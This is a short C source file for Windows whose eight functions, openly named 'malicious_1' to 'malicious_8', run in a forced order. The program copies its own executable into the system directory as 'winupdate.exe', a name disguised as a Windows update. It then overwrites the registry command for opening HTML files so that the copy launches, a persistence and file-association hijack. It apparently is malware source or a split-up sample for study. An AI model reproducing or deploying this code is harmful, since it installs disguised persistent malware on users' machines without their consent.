#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <shellapi.h>

int order = 0;

char MyPath[256];
char CpyPath[256];
HKEY Key32;

void malicious_1()
{
    if ((1 - order) == 1)
    {
	order = 1;
	GetModuleFileName(NULL, MyPath, sizeof(MyPath));
    }
}

void malicious_2()
{
    if ((2 - order) == 1)
    {
	order = 2;
	GetSystemDirectory(CpyPath, sizeof(CpyPath));
    }
}

void malicious_3()
{
    if ((3 - order) == 1)
    {
	order = 3;
	strcat(CpyPath, "\\winupdate.exe");
    }
}

void malicious_4()
{
    if ((4 - order) == 1)
    {
	order = 4;
	CopyFile(MyPath, CpyPath, FALSE);
    }
}

void malicious_5()
{
    if ((5 - order) == 1)
    {
	order = 5;
	strcat(CpyPath, " %1");
    }
}

void malicious_6()
{
    if ((6 - order) == 1)
    {
	order = 6;
	RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0, KEY_WRITE, &Key32);
    }
}

void malicious_7()
{
    if ((7 - order) == 1)
    {
	order = 7;
	RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
    }
}

void malicious_8()
{
    if ((8 - order) == 1)
    {
	order = 8;
	RegCloseKey(Key32);
    }
}
